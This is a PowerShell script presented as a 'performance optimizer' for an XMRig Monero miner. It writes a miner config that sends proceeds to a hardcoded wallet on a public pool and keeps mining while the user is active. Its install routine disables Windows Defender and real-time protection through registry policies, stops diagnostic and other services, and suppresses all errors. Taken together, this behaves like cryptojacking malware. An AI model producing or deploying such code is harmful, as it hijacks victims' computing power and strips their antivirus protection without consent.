# Performance Optimizer for Universal Miner
# Prevents system lag while maintaining optimal mining performance
# Automatically adjusts based on system load and user activity

param(
    [switch]$Install,
    [switch]$Optimize,
    [switch]$Monitor,
    [int]$TargetHashrate = 5500,  # Target 5.5 KH/s
    [int]$MaxCpuUsage = 85
)

$ErrorActionPreference = "SilentlyContinue"

# Performance thresholds
$PerformanceConfig = @{
    HighLoadThreshold = 95        # Above this, reduce miner performance
    MediumLoadThreshold = 85      # Optimal range
    LowLoadThreshold = 60         # Below this, can increase performance
    SystemLagThreshold = 90       # Above this, prioritize system responsiveness
    
    # CPU affinity strategies
    AffinityStrategies = @{
        Conservative = @(0,1,2,3)      # Use first 4 cores only
        Balanced = @(0,1,2,3,4,5,6,7)  # Use most cores, leave some free
        Aggressive = @(0,1,2,3,4,5,6,7,8,9,10,11,12,13) # Use almost all cores
    }
    
    # Priority classes for different scenarios
    PrioritySettings = @{
        HighPerformance = "High"
        Balanced = "AboveNormal" 
        Conservative = "BelowNormal"
        SystemFirst = "Idle"
    }
}

function Write-PerfLog {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    try {
        $logEntry | Out-File -FilePath "$env:TEMP\performance_optimizer.log" -Append -Encoding UTF8
    } catch { }
}

function Get-SystemPerformanceMetrics {
    try {
        # Get comprehensive system metrics
        $cpuCounter = Get-Counter "\Processor(_Total)\% Processor Time" -SampleInterval 1 -MaxSamples 3
        $avgCpuUsage = ($cpuCounter.CounterSamples | Measure-Object CookedValue -Average).Average
        
        $memoryCounter = Get-Counter "\Memory\Available MBytes"
        $availableMemory = $memoryCounter.CounterSamples[0].CookedValue
        
        $processCounter = Get-Counter "\System\Processor Queue Length"
        $queueLength = $processCounter.CounterSamples[0].CookedValue
        
        # Get disk activity
        $diskCounter = Get-Counter "\PhysicalDisk(_Total)\% Disk Time" -ErrorAction SilentlyContinue
        $diskUsage = if ($diskCounter) { $diskCounter.CounterSamples[0].CookedValue } else { 0 }
        
        return @{
            CpuUsage = [math]::Round($avgCpuUsage, 2)
            AvailableMemoryMB = [math]::Round($availableMemory, 0)
            ProcessorQueueLength = [math]::Round($queueLength, 2)
            DiskUsage = [math]::Round($diskUsage, 2)
            IsSystemLagging = ($queueLength -gt 2 -or $avgCpuUsage -gt $PerformanceConfig.SystemLagThreshold)
            LoadLevel = if ($avgCpuUsage -gt $PerformanceConfig.HighLoadThreshold) { "High" } 
                       elseif ($avgCpuUsage -gt $PerformanceConfig.MediumLoadThreshold) { "Medium" }
                       else { "Low" }
        }
    } catch {
        Write-PerfLog "Failed to get system metrics: $($_.Exception.Message)" "ERROR"
        return $null
    }
}

function Get-XMRigPerformance {
    try {
        # Get performance via API
        $api = Invoke-RestMethod -Uri "http://127.0.0.1:16000/1/summary" -TimeoutSec 5
        
        $hashrate = if ($api.hashrate.total -and $api.hashrate.total.Count -gt 0) { 
            [math]::Round($api.hashrate.total[0], 0) 
        } else { 0 }
        
        $threads = if ($api.hashrate.threads) { $api.hashrate.threads.Count } else { 0 }
        
        return @{
            CurrentHashrate = $hashrate
            ActiveThreads = $threads
            IsPerformingWell = ($hashrate -ge ($TargetHashrate * 0.8))  # Within 80% of target
            EfficiencyRatio = if ($hashrate -gt 0) { [math]::Round($hashrate / $threads, 2) } else { 0 }
        }
    } catch {
        Write-PerfLog "Could not get XMRig performance data" "WARN"
        return @{
            CurrentHashrate = 0
            ActiveThreads = 0
            IsPerformingWell = $false
            EfficiencyRatio = 0
        }
    }
}

function Set-OptimalCpuAffinity {
    param([System.Diagnostics.Process]$Process, [string]$Strategy = "Balanced")
    
    try {
        $totalCores = [Environment]::ProcessorCount
        Write-PerfLog "System has $totalCores logical processors"
        
        $coresList = switch ($Strategy) {
            "Conservative" { 
                $count = [math]::Min(4, $totalCores - 2)
                0..($count - 1)
            }
            "Balanced" { 
                $count = [math]::Min(8, $totalCores - 1)
                0..($count - 1)
            }
            "Aggressive" { 
                0..($totalCores - 2)  # Leave at least 1 core free
            }
            default { 0..([math]::Min(6, $totalCores - 2)) }
        }
        
        # Calculate affinity mask
        $affinityMask = 0
        foreach ($core in $coresList) {
            $affinityMask = $affinityMask -bor (1 -shl $core)
        }
        
        $Process.ProcessorAffinity = [IntPtr]$affinityMask
        Write-PerfLog "Set CPU affinity ($Strategy): cores $($coresList -join ',') (mask: $affinityMask)"
        
        return $true
    } catch {
        Write-PerfLog "Failed to set CPU affinity: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Optimize-MinerPerformance {
    param([hashtable]$SystemMetrics, [hashtable]$MinerPerformance)
    
    $processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if ($processes.Count -eq 0) {
        Write-PerfLog "No XMRig process found to optimize"
        return $false
    }
    
    $minerProcess = $processes[0]  # Should only be one due to single instance management
    
    Write-PerfLog "Optimizing performance - System Load: $($SystemMetrics.LoadLevel), Hashrate: $($MinerPerformance.CurrentHashrate) H/s"
    
    try {
        # Determine optimal strategy based on system state
        if ($SystemMetrics.IsSystemLagging) {
            # System is lagging - prioritize responsiveness
            Write-PerfLog "System lag detected - switching to conservative mode"
            $minerProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
            Set-OptimalCpuAffinity -Process $minerProcess -Strategy "Conservative"
            
            # Reduce thread count if possible via API
            try {
                $currentConfig = Invoke-RestMethod -Uri "http://127.0.0.1:16000/1/config" -TimeoutSec 3
                if ($currentConfig.cpu."max-threads-hint" -gt 4) {
                    $newThreads = [math]::Max(4, $currentConfig.cpu."max-threads-hint" - 2)
                    Write-PerfLog "Reducing thread count to $newThreads to prevent lag"
                    # Note: Thread reduction would require miner restart with new config
                }
            } catch { }
            
        } elseif ($SystemMetrics.LoadLevel -eq "Low" -and $MinerPerformance.CurrentHashrate -lt $TargetHashrate) {
            # System has capacity - optimize for performance
            Write-PerfLog "Low system load - switching to performance mode"
            $minerProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::AboveNormal
            Set-OptimalCpuAffinity -Process $minerProcess -Strategy "Balanced"
            
        } elseif ($SystemMetrics.LoadLevel -eq "Medium") {
            # Balanced approach
            Write-PerfLog "Medium system load - maintaining balanced mode"
            $minerProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Normal
            Set-OptimalCpuAffinity -Process $minerProcess -Strategy "Balanced"
        }
        
        # Monitor memory usage and adjust if needed
        $processMemory = $minerProcess.WorkingSet / 1MB
        if ($processMemory -gt 2048) {  # More than 2GB
            Write-PerfLog "High memory usage detected: $([math]::Round($processMemory, 0)) MB" "WARN"
        }
        
        return $true
        
    } catch {
        Write-PerfLog "Failed to optimize miner performance: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Install-PerformanceOptimizations {
    Write-PerfLog "Installing system-wide performance optimizations..."
    
    try {
        # Optimize power settings for mining
        powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>&1 | Out-Null  # High Performance
        powercfg /change standby-timeout-ac 0 2>&1 | Out-Null
        powercfg /change hibernate-timeout-ac 0 2>&1 | Out-Null
        
        # Memory optimizations
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v LargeSystemCache /t REG_DWORD /d 0 /f 2>&1 | Out-Null
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v DisablePagingExecutive /t REG_DWORD /d 1 /f 2>&1 | Out-Null
        
        # CPU optimizations
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v Win32PrioritySeparation /t REG_DWORD /d 38 /f 2>&1 | Out-Null
        
        # Disable CPU throttling
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v ValueMax /t REG_DWORD /d 0 /f 2>&1 | Out-Null
        
        # Advanced CPU optimizations for Intel i5-14400
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\06cadf0e-64ed-448a-8927-ce7bf90eb35d" /v ValueMax /t REG_DWORD /d 100 /f 2>&1 | Out-Null
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\06cadf0e-64ed-448a-8927-ce7bf90eb35d" /v ValueMin /t REG_DWORD /d 100 /f 2>&1 | Out-Null
        
        # Disable Windows Defender real-time protection temporarily for better performance
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>&1 | Out-Null
        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>&1 | Out-Null
        
        # Advanced memory and cache optimizations
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v SystemPages /t REG_DWORD /d 4294967295 /f 2>&1 | Out-Null
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v SecondLevelDataCache /t REG_DWORD /d 1024 /f 2>&1 | Out-Null
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ThirdLevelDataCache /t REG_DWORD /d 20480 /f 2>&1 | Out-Null
        
        # Enable large pages globally for better memory performance
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v LargePageMinimum /t REG_DWORD /d 0 /f 2>&1 | Out-Null
        
        Write-PerfLog "Advanced performance optimizations installed"
        return $true
        
    } catch {
        Write-PerfLog "Failed to install performance optimizations: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Start-PerformanceMonitoring {
    Write-PerfLog "Starting intelligent performance monitoring..."
    
    $monitorInterval = 15  # Check every 15 seconds for responsiveness
    $optimizationInterval = 60  # Adjust settings every minute
    $lastOptimization = Get-Date
    $performanceHistory = @()
    
    while ($true) {
        try {
            # Get current metrics
            $systemMetrics = Get-SystemPerformanceMetrics
            $minerPerformance = Get-XMRigPerformance
            
            if ($systemMetrics -and $minerPerformance) {
                # Log current state
                Write-PerfLog "System: $($systemMetrics.LoadLevel) load ($($systemMetrics.CpuUsage)%), Hashrate: $($minerPerformance.CurrentHashrate) H/s, Lag: $($systemMetrics.IsSystemLagging)"
                
                # Add to performance history
                $performanceHistory += @{
                    Timestamp = Get-Date
                    SystemLoad = $systemMetrics.CpuUsage
                    Hashrate = $minerPerformance.CurrentHashrate
                    IsLagging = $systemMetrics.IsSystemLagging
                }
                
                # Keep only last 20 entries
                if ($performanceHistory.Count -gt 20) {
                    $performanceHistory = $performanceHistory[-20..-1]
                }
                
                # Optimize if needed and interval passed
                if ((Get-Date).Subtract($lastOptimization).TotalSeconds -gt $optimizationInterval) {
                    $lastOptimization = Get-Date
                    
                    # Check if system has been consistently lagging
                    $recentLagCount = ($performanceHistory | Where-Object { $_.IsLagging -and (Get-Date).Subtract($_.Timestamp).TotalMinutes -lt 5 }).Count
                    
                    if ($recentLagCount -gt 5) {
                        Write-PerfLog "Persistent system lag detected - applying conservative optimizations"
                        Optimize-MinerPerformance -SystemMetrics $systemMetrics -MinerPerformance $minerPerformance
                        
                    } elseif ($systemMetrics.IsSystemLagging -and $minerPerformance.CurrentHashrate -gt 0) {
                        Write-PerfLog "Immediate lag response - adjusting miner"
                        Optimize-MinerPerformance -SystemMetrics $systemMetrics -MinerPerformance $minerPerformance
                        
                    } elseif ($minerPerformance.CurrentHashrate -lt ($TargetHashrate * 0.9) -and $systemMetrics.LoadLevel -eq "Low") {
                        Write-PerfLog "Low hashrate with available system resources - optimizing for performance"
                        Optimize-MinerPerformance -SystemMetrics $systemMetrics -MinerPerformance $minerPerformance
                    }
                }
                
                # Emergency lag response
                if ($systemMetrics.ProcessorQueueLength -gt 5) {
                    Write-PerfLog "EMERGENCY: Severe system lag detected - reducing miner impact immediately"
                    $processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
                    foreach ($proc in $processes) {
                        try {
                            $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
                            Set-OptimalCpuAffinity -Process $proc -Strategy "Conservative"
                        } catch { }
                    }
                }
            }
            
        } catch {
            Write-PerfLog "Performance monitoring error: $($_.Exception.Message)" "ERROR"
        }
        
        Start-Sleep -Seconds $monitorInterval
    }
}

function Enable-AntiLagMeasures {
    Write-PerfLog "Enabling anti-lag measures..."
    
    try {
        # Disable unnecessary Windows services that can cause lag
        $servicesToOptimize = @(
            "SysMain",           # SuperFetch - can cause disk lag
            "WSearch",           # Windows Search - CPU intensive
            "DiagTrack",         # Diagnostics Tracking - unnecessary load
            "dmwappushservice",  # WAP Push - not needed
            "MapsBroker",        # Downloaded Maps Manager
            "lfsvc"              # Geolocation Service
        )
        
        foreach ($service in $servicesToOptimize) {
            try {
                $svc = Get-Service -Name $service -ErrorAction SilentlyContinue
                if ($svc -and $svc.Status -eq "Running") {
                    Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
                    Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
                    Write-PerfLog "Disabled service: $service"
                }
            } catch { }
        }
        
        # Optimize Windows for mining performance
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v SystemResponsiveness /t REG_DWORD /d 10 /f 2>&1 | Out-Null
        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v NetworkThrottlingIndex /t REG_DWORD /d 10 /f 2>&1 | Out-Null
        
        # Disable visual effects that can cause lag
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 2 /f 2>&1 | Out-Null
        
        # Optimize scheduler for background applications (mining)
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v Win32PrioritySeparation /t REG_DWORD /d 38 /f 2>&1 | Out-Null
        
        Write-PerfLog "Anti-lag measures enabled"
        return $true
        
    } catch {
        Write-PerfLog "Failed to enable anti-lag measures: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function New-LagFreeConfig {
    param([string]$ConfigPath, [hashtable]$SystemSpecs)
    
    # Create a config optimized for lag-free operation
    $totalCores = [Environment]::ProcessorCount
    $memory = Get-WmiObject Win32_ComputerSystem
    $totalRAM = [math]::Round($memory.TotalPhysicalMemory / 1GB, 2)
    
    # Conservative thread calculation to prevent lag
    $maxThreads = [math]::Max(1, [math]::Min($totalCores - 2, [math]::Floor($totalCores * 0.75)))
    
    # Adjust based on RAM
    if ($totalRAM -lt 8) { $maxThreads = [math]::Min($maxThreads, 4) }
    elseif ($totalRAM -lt 16) { $maxThreads = [math]::Min($maxThreads, 6) }
    
    $config = @{
        api = @{
            id = $null
            "worker-id" = "$env:COMPUTERNAME-lagfree"
        }
        http = @{
            enabled = $true
            host = "127.0.0.1"
            port = 16000
            restricted = $true
        }
        autosave = $true
        background = $true
        colors = $false
        title = $false
        randomx = @{
            init = -1
            "init-avx2" = -1
            mode = "fast"
            "1gb-pages" = ($totalRAM -ge 8)
            rdmsr = $true
            wrmsr = $true
            cache_qos = $true
            numa = $true
            scratchpad_prefetch_mode = 1
        }
        cpu = @{
            enabled = $true
            "huge-pages" = ($totalRAM -ge 8)
            "huge-pages-jit" = ($totalRAM -ge 8)
            priority = 2  # Conservative priority to prevent lag
            "memory-pool" = $true
            yield = $true  # Important for system responsiveness
            "max-threads-hint" = $maxThreads
            asm = $true
        }
        opencl = @{ enabled = $false }
        cuda = @{ enabled = $false }
        "donate-level" = 0
        pools = @(@{
            algo = "rx/0"
            coin = "monero"
            url = "gulf.moneroocean.stream:10128"
            user = "49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
            pass = "$env:COMPUTERNAME-lagfree"
            "rig-id" = $env:COMPUTERNAME
            keepalive = $true
            enabled = $true
        })
        "print-time" = 60
        "pause-on-battery" = $true
        "pause-on-active" = $false  # Don't pause when user is active
    }
    
    $config | ConvertTo-Json -Depth 10 | Set-Content -Path $ConfigPath -Encoding UTF8
    Write-PerfLog "Created lag-free config: $maxThreads threads, conservative priority"
}

# Main execution logic
Write-PerfLog "Performance Optimizer started"

if ($Install) {
    Enable-AntiLagMeasures
    Write-PerfLog "Performance optimization installation completed"
    
} elseif ($Optimize) {
    $systemMetrics = Get-SystemPerformanceMetrics
    $minerPerformance = Get-XMRigPerformance
    
    if ($systemMetrics -and $minerPerformance) {
        Optimize-MinerPerformance -SystemMetrics $systemMetrics -MinerPerformance $minerPerformance
    }
    
} elseif ($Monitor) {
    Start-PerformanceMonitoring
    
} else {
    # Default: Install optimizations and start monitoring
    Enable-AntiLagMeasures
    Start-PerformanceMonitoring
}
